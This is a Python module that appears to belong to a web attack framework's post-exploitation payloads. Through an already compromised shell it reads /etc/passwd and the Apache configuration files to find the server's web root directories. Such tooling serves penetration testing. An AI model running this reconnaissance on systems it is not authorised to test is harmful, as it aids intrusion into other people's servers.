import re
from plugins.attack.payloads.base_payload import base_payload
import core.data.kb.knowledgeBase as kb

class apache_root_directory(base_payload):
    '''
    This payload finds Apache Root Directories where websites are hosted.
    '''
    def run_read(self):
        result = []

        def parse_etc_passwd(etc_passwd, user):
            root = re.search('(?<='+user+':/)(.*?)\:', etc_passwd)
            if root:
                return root.group(1)
            else:
                return ''

        def parse_config_file(config_file):
            root = re.search('(?<=DocumentRoot )(.*)', config_file)
            if root:
                return root.group(1)
            else:
                return ''

        users = self.exec_payload('apache_run_user')
        if users:
            for user in users:
                result.append('/'+parse_etc_passwd(self.shell.read('/etc/passwd'),  user)+'/')

        apache_config_files = self.exec_payload('apache_config_files')
        if apache_config_files:
            for file in apache_config_files:
                if parse_config_file(self.shell.read(file)) != '':
                    result.append(parse_config_file(self.shell.read(file))+'/')

        if kb.kb.getData('pathdisclosure', 'webroot'):
            result.append(kb.kb.getData('pathdisclosure', 'webroot'))

        result = list(set(result))
        result = [p for p in result if p != '']
        return result
